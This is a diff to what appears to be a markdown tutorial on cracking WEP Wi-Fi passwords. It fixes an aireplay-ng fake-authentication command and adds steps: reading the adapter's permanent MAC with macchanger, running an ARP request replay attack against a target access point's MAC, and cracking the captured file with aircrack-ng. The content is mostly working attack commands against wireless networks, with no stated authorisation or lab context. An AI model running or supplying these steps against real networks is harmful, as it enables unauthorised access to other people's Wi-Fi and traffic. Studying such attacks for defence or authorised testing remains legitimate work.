@@ -55,9 +55,23 @@ aircrack-ng test.cap
 ```
 2. We will need to commmunicate with the WEP network by creating a Fake Authentication attack using aireplay-ng
 ```bash
-aireplay-ng --fakeauth 0 B4:75:0E:36:6A:9E -h 6E:3D:AC:84:DB:A0 wlan0
+aireplay-ng --fakeauth 0 -a B4:75:0E:36:6A:9E -h 6E:3D:AC:84:DB:A0 wlan0
 ```
 >the first MAC is the target and the second MAC is the USB adapter.
+>If you want to know the permanent MAC address of the USB adapter
+```bash
+macchanger -s wlan0
+Current MAC:   ba:1f:40:bc:19:d4 (unknown)
+Permanent MAC: 34:7d:e4:40:83:86 (unknown)
+```
+3. We need to create an ARP Request preplay attack to generate new packets
+```bash
+aireplay-ng --arpreplay -b B4:75:0E:36:6A:9E -h ba:1f:40:bc:19:d4 wlan0
+```
+4. We will then crack the file we created to find the password.
+```bash
+aircrack-ng arpreplay-01.cap
+```
 
 ### Steps for WPA/WPA2
 
